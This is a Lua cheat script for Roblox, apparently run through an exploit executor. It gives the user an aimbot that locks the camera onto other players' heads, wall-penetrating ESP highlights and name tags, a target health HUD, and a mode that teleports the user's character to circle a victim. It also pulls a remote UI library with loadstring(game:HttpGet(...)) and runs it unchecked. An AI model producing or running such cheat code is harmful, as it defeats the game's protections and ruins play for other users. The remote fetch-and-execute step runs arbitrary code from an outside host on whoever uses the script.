-- Load necessary services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera
local CoreGui = game:FindService("CoreGui")

-- Define colors
local Green = Color3.fromRGB(0, 255, 0)
local Red = Color3.fromRGB(255, 0, 0)

-- Aimbot settings
local player = Players.LocalPlayer
local aiming = false
local pcMod = false
local radius = 150
local useTeamCheck = true
local useWallCheck = true
local targetPart = "Head"
local lockOnTarget = false
local currentTarget = nil
local espEnabled = true
local teleportEnabled = false
local rotationSpeed = 10
local verticalSpeedMultiplier = 2
local rotationRadius = 5
local verticalAmplitude = 3
local isRotating = false
local aimSmoothness = 0.1
local hideFOV = false

-- ESP and HUD settings
local espConnections = {}
local espNames = {} -- Для хранения BillboardGui с никами
local Storage = Instance.new("Folder")
Storage.Parent = CoreGui
Storage.Name = "Highlight_Storage"
local NameStorage = Instance.new("Folder")
NameStorage.Parent = CoreGui
NameStorage.Name = "Name_Storage"

-- Target HUD settings
local hud = { visible = false }

-- Utility function to create Drawing objects
local function NewDrawing(className, properties)
    local drawing = Drawing.new(className)
    for prop, value in pairs(properties) do
        drawing[prop] = value
    end
    return drawing
end

-- Aimbot circle
local aimbotCircle = NewDrawing("Circle", {
    Color = Red,
    Thickness = 2,
    Radius = radius,
    Filled = false,
    Visible = true,
})

-- Initialize HUD
local function initTargetHUD()
    hud.rect = NewDrawing("Square", {
        Size = Vector2.new(200, 100),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 120, Camera.ViewportSize.Y / 2 - 50),
        Color = Color3.fromRGB(50, 50, 50),
        Filled = true,
        Visible = false,
        Thickness = 2,
    })
    hud.healthBar = NewDrawing("Square", {
        Size = Vector2.new(180, 20),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 130, Camera.ViewportSize.Y / 2 + 20),
        Color = Green,
        Filled = true,
        Visible = false,
    })
    hud.avatar = NewDrawing("Image", {
        Size = Vector2.new(60, 60),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 130, Camera.ViewportSize.Y / 2 - 40),
        Data = "",
        Visible = false,
    })
    hud.name = NewDrawing("Text", {
        Text = "",
        Size = 20,
        Center = true,
        Outline = true,
        Color = Color3.fromRGB(255, 255, 255),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 220, Camera.ViewportSize.Y / 2 - 10),
        Visible = false,
    })
end
initTargetHUD()

-- Update HUD
local function updateTargetHUD()
    if currentTarget and currentTarget.Parent and currentTarget.Parent:FindFirstChild("Humanoid") and currentTarget.Parent.Humanoid.Health > 0 then
        local targetPlayer = Players:GetPlayerFromCharacter(currentTarget.Parent)
        local humanoid = currentTarget.Parent.Humanoid
        hud.visible = true
        for _, element in pairs(hud) do
            if element.Visible ~= nil then element.Visible = true end
        end

        local healthPercent = humanoid.Health / humanoid.MaxHealth
        hud.healthBar.Size = Vector2.new(180 * healthPercent, 20)
        hud.healthBar.Color = Color3.fromRGB(255 * (1 - healthPercent), 255 * healthPercent, 0)

        if targetPlayer and not hud.avatar.Data then
            hud.avatar.Data = game:HttpGet("https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userId=" .. targetPlayer.UserId)
        end

        hud.name.Text = targetPlayer and targetPlayer.Name or "Unknown"
    else
        hud.visible = false
        for _, element in pairs(hud) do
            if element.Visible ~= nil then element.Visible = false end
        end
    end
end

-- Check if target is visible
local function isTargetVisible(targetPosition, targetPlayer)
    if not useWallCheck then return true end
    local origin = Camera.CFrame.Position
    local direction = (targetPosition - origin).Unit * (targetPosition - origin).Magnitude
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(origin, direction, raycastParams)
    return not raycastResult or (raycastResult.Instance.Parent == targetPlayer.Character)
end

-- Check if target is in front of the camera
local function isTargetInFront(targetPosition)
    local cameraDirection = Camera.CFrame.LookVector
    local targetDirection = (targetPosition - Camera.CFrame.Position).Unit
    local dotProduct = cameraDirection:Dot(targetDirection)
    return dotProduct > 0 -- Цель перед камерой, если угол < 90 градусов
end

-- Get closest target
local function getClosestTargetInRadius()
    local closestTarget = nil
    local shortestDistance = math.huge
    local radiusBuffer = radius * 1.2

    for _, targetPlayer in pairs(Players:GetPlayers()) do
        if targetPlayer ~= player and targetPlayer.Character then
            local character = targetPlayer.Character
            local humanoid = character:FindFirstChild("Humanoid")
            local part = character:FindFirstChild(targetPart)
            if humanoid and part and humanoid.Health > 0 then
                if not useTeamCheck or (player.Team ~= targetPlayer.Team) then
                    local screenPos, onScreen = Camera:WorldToViewportPoint(part.Position)
                    local distanceToCenter = (Vector2.new(screenPos.X, screenPos.Y) - aimbotCircle.Position).Magnitude
                    local isNearScreen = screenPos.X > -100 and screenPos.X < Camera.ViewportSize.X + 100 and screenPos.Y > -100 and screenPos.Y < Camera.ViewportSize.Y + 100
                    if (onScreen or isNearScreen) and distanceToCenter <= radiusBuffer and isTargetVisible(part.Position, targetPlayer) and isTargetInFront(part.Position) then
                        local distance = (part.Position - Camera.CFrame.Position).Magnitude
                        if distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = part
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end

-- Smoothly aim at target
local function aimAtTarget(deltaTime)
    if not aiming then
        aimbotCircle.Color = Red
        currentTarget = nil
        isRotating = false
        return
    end

    currentTarget = getClosestTargetInRadius()
    if not currentTarget then
        aimbotCircle.Color = Red
        isRotating = false
        return
    end

    local targetPlayer = Players:GetPlayerFromCharacter(currentTarget.Parent)
    if targetPlayer and currentTarget.Parent:FindFirstChild("Humanoid") and currentTarget.Parent.Humanoid.Health > 0 then
        local screenPos, onScreen = Camera:WorldToViewportPoint(currentTarget.Position)
        local distanceToCenter = (Vector2.new(screenPos.X, screenPos.Y) - aimbotCircle.Position).Magnitude
        if (onScreen or (screenPos.X > -100 and screenPos.X < Camera.ViewportSize.X + 100 and screenPos.Y > -100 and screenPos.Y < Camera.ViewportSize.Y + 100)) and distanceToCenter <= radius * 1.2 and isTargetVisible(currentTarget.Position, targetPlayer) and isTargetInFront(currentTarget.Position) then
            local targetCFrame = CFrame.new(Camera.CFrame.Position, currentTarget.Position)
            local smoothnessFactor = math.clamp(aimSmoothness, 0.1, 1)
            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, smoothnessFactor)
            aimbotCircle.Color = Green
        else
            aimbotCircle.Color = Red
        end
    end

    if teleportEnabled and currentTarget then
        local character = player.Character or player.CharacterAdded:Wait()
        if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
            local humanoid = character.Humanoid
            if humanoid.Health > 0 then
                local targetPos = currentTarget.Position
                local direction = (targetPos - Camera.CFrame.Position).Unit
                local behindPos = targetPos - direction * rotationRadius

                local raycastParams = RaycastParams.new()
                raycastParams.FilterDescendantsInstances = {character}
                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                local raycastResult = workspace:Raycast(targetPos, behindPos - targetPos, raycastParams)
                if not raycastResult then
                    local hrp = character.HumanoidRootPart
                    hrp.CFrame = CFrame.lookAt(behindPos, targetPos)
                    isRotating = true
                end
            end
        end
    end
end

-- ESP with Highlights and Names
local function Highlight(plr)
    local Highlight = Instance.new("Highlight")
    Highlight.Name = plr.Name
    Highlight.FillColor = (plr.TeamColor == player.TeamColor) and Green or Red
    Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    Highlight.FillTransparency = 0.5
    Highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    Highlight.OutlineTransparency = 0
    Highlight.Parent = Storage
    Highlight.Enabled = espEnabled

    local plrchar = plr.Character
    if plrchar then
        Highlight.Adornee = plrchar
    end

    espConnections[plr] = plr.CharacterAdded:Connect(function(char)
        Highlight.Adornee = char
    end)

    -- Добавляем ник
    local billboard = Instance.new("BillboardGui")
    billboard.Name = plr.Name .. "_Name"
    billboard.Parent = NameStorage
    billboard.Adornee = plrchar and plrchar:FindFirstChild("Head")
    billboard.Size = UDim2.new(0, 100, 0, 30)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.AlwaysOnTop = true
    billboard.Enabled = espEnabled

    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = billboard
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = plr.Name
    textLabel.TextColor3 = (plr.TeamColor == player.TeamColor) and Green or Red
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextStrokeTransparency = 0

    espNames[plr] = billboard

    -- Add bounding box for NPCs
    if plr:IsA("NPC") then
        local box = Instance.new("BoxHandleAdornment")
        box.Size = plrchar.Size
        box.Adornee = plrchar
        box.AlwaysOnTop = true
        box.Color3 = Red
        box.Parent = plrchar
    end
end

-- Initialize ESP for existing players
for _, v in next, Players:GetPlayers() do
    Highlight(v)
end

-- Handle new players
Players.PlayerAdded:Connect(Highlight)

-- Handle player removal
Players.PlayerRemoving:Connect(function(plr)
    local plrname = plr.Name
    if Storage[plrname] then
        Storage[plrname]:Destroy()
    end
    if NameStorage[plrname .. "_Name"] then
        NameStorage[plrname .. "_Name"]:Destroy()
    end
    if espConnections[plr] then
        espConnections[plr]:Disconnect()
    end
end)

-- Update ESP visibility based on espEnabled
local function updateESP()
    for _, highlight in pairs(Storage:GetChildren()) do
        highlight.Enabled = espEnabled
    end
    for _, nameGui in pairs(NameStorage:GetChildren()) do
        nameGui.Enabled = espEnabled
    end
end

-- Rayfield UI
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Aimbot Interface",
    LoadingTitle = "Loading Aimbot...",
    LoadingSubtitle = "by Sirius",
    ConfigurationSaving = { Enabled = true, FileName = "AimbotConfig" },
    KeySystem = false,
})

local AimbotTab = Window:CreateTab("Aimbot", 4483362458)

AimbotTab:CreateToggle({ Name = "Enable Aimbot", CurrentValue = false, Callback = function(Value) aiming = Value end })
AimbotTab:CreateSlider({ Name = "Aimbot Radius", Range = {1, 500}, Increment = 1, CurrentValue = radius, Callback = function(Value) radius = Value; aimbotCircle.Radius = Value end })
AimbotTab:CreateToggle({ Name = "Team Check", CurrentValue = useTeamCheck, Callback = function(Value) useTeamCheck = Value end })
AimbotTab:CreateToggle({ Name = "Wall Check", CurrentValue = useWallCheck, Callback = function(Value) useWallCheck = Value end })
AimbotTab:CreateDropdown({ Name = "Target Part", Options = {"Head", "Torso"}, CurrentOption = targetPart, Callback = function(Option) targetPart = Option; currentTarget = nil end })
AimbotTab:CreateToggle({ Name = "Lock On Target", CurrentValue = lockOnTarget, Callback = function(Value) lockOnTarget = Value; if not Value then currentTarget = nil end end })
AimbotTab:CreateToggle({ Name = "PC Mod", CurrentValue = pcMod, Callback = function(Value) pcMod = Value end })
AimbotTab:CreateToggle({ Name = "Enable ESP", CurrentValue = espEnabled, Callback = function(Value) espEnabled = Value; updateESP() end })
AimbotTab:CreateToggle({ Name = "Enable Teleport", CurrentValue = teleportEnabled, Callback = function(Value) teleportEnabled = Value; if not Value then isRotating = false end end })
AimbotTab:CreateSlider({ Name = "Aim Smoothness", Range = {0, 1}, Increment = 0.05, CurrentValue = aimSmoothness, Callback = function(Value) aimSmoothness = Value end })
AimbotTab:CreateToggle({ Name = "Hide FOV", CurrentValue = false, Callback = function(Value) hideFOV = Value end })

-- Main loop
RunService.RenderStepped:Connect(function(deltaTime)
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    aimbotCircle.Position = screenCenter
    aimbotCircle.Visible = not hideFOV

    if pcMod then
        aiming = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
    end

    aimAtTarget(deltaTime)
    updateTargetHUD()
    updateESP()

    if isRotating and currentTarget then
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local hrp = character.HumanoidRootPart
            local targetPos = currentTarget.Position
            local angle = tick() * rotationSpeed
            local verticalAngle = tick() * rotationSpeed * verticalSpeedMultiplier
            local offset = Vector3.new(math.sin(angle), math.abs(math.sin(verticalAngle)) * verticalAmplitude, math.cos(angle)) * rotationRadius
            hrp.CFrame = CFrame.lookAt(targetPos + offset, targetPos)
        end
    end
end)

-- Cleanup
player.CharacterAdded:Connect(function() currentTarget = nil; isRotating = false end)
